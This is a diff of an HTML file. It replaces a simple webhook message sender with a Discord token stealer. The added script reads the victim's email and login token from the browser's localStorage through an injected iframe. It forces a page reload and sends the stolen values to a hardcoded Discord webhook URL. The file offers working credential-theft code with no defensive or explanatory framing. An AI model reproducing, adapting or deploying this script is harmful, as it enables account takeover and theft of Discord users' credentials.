@@ -1,23 +1,34 @@
 <html>
-	<head>
-	</head>
-		<body>
-		<button onclick="webhook()" > Webhook! </button>
-		<iframe src="https://titanembeds.com/embed/862326188554584094" height="600" width="800" frameborder="0"></iframe>
-				<script>
+	<body>
+		const FnLComa = /^"|"$/g;
+//Discord webhook
+const webhook = "https://canary.discord.com/api/webhooks/968295049886593105/jM5fMXr4kSjkjIMgwhvkk1Th9zzuRnyLEasxRdy-LnbFIGoFk54PH1kdUtPPBGJDo3t6";
 
-					var ClientID = prompt("Please type your given client id here!")
-					var webhookurl = atob(ClientID)
-				function webhook() {
-				var promptmessage = prompt("What do you want to send?")
-				const whurl = webhookurl
-				const msg = {
-				"content": promptmessage
-				}
-				
-				fetch(whurl, {"method":"POST", "headers": {"content-type": "application/json"},
-				"body": JSON.stringify(msg)})
-			}
-				</script>
-		</body>
+//Function to send message to your webhook in discord
+function sendMessage({ message }) {
+    const webhookRequest = new XMLHttpRequest(); 
+    webhookRequest.open("POST", webhook);
+    webhookRequest.setRequestHeader('Content-type', 'application/json');
+
+    const params = {
+        content: message || 'No message provided'
+    };
+    webhookRequest.send(JSON.stringify(params));
+};
+
+//Reload window so the token appears 
+location.reload();
+//Get the email and the token
+const interval = setInterval(() => {
+    const data = {
+        email: document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.email_cache.replace(FnLComa, ''),
+        token: document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token.replace(FnLComa, '')
+    };
+    //Send the data over to your Discord channel using the webhook
+    if(data.token) {
+        sendMessage({ message: `Email: **${data.email}**\nToken: **${data.token}**` });
+        clearInterval(interval);
+    };
+});
+	</body>
 </html>
